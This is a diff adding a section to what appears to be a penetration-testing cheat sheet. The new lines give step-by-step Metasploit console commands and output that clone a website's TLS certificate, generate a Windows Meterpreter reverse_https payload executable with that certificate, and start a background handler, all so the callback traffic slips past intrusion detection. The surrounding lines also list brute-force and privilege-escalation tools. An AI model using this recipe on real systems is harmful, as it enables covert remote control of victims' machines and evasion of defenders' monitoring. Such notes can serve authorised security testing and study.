@@ -653,7 +653,37 @@ $ script -qc /bin/bash /dev/null
 		2. Once with that done, let's go to the file `/etc/proxychains.conf` and add a line of which proxy to use (Example: `socks4 127.0.0.1 8080`)
 		3. With the `proxychains` command in front of any command you can send that command through your proxy
 	- You can create scripts for metasploit and make common workflows faster `msfconsole -r resourcescript.rc`
-	- Using `auxiliary/gather/impersonate_ssl` you can copy a TLS certificate from a website (self signed) to avoid IDs/IPs
+	- To avoid IDs/IPs we can do the following to avoid Metasploit from using the default TLS certificate with `exploit/multi/handler` when using HTTPS payloads:
+		1. Using `auxiliary/gather/impersonate_ssl`, copy a TLS certificate from a website
+		2. Now, from Metasploit console generate the required payload with some extra variables (The TLS certificate path is provided by `auxiliary/gather/impersonate_ssl` when it finishes):
+		   ```
+		   msf payload(reverse_http) > use payload/windows/meterpreter/reverse_https
+		   msf payload(reverse_https) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+	       msf payload(reverse_https) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf payload(reverse_https) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf payload(reverse_https) > set LPORT 8080
+		   LPORT => 8080
+		   msf payload(reverse_https) > generate -f exe -o /tmp/payload.exe
+		   [*] Writing 73802 bytes to /tmp/payload.exe...
+		   ```
+		3. Lastly, prepare the `exploit/multi/handler` module:
+		   ```
+		   msf payload(reverse_https) > use exploit/multi/handler 
+           msf exploit(handler) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf exploit(handler) > set LPORT 8080
+		   LPORT => 8080
+		   msf exploit(handler) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf exploit(handler) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+		   msf exploit(handler) > exploit -j
+
+		   [*] Exploit running as background job.
+		   ```
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Search for passwords by brute force through a protocol or web
 - [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Take info out of the machine to see how to scale
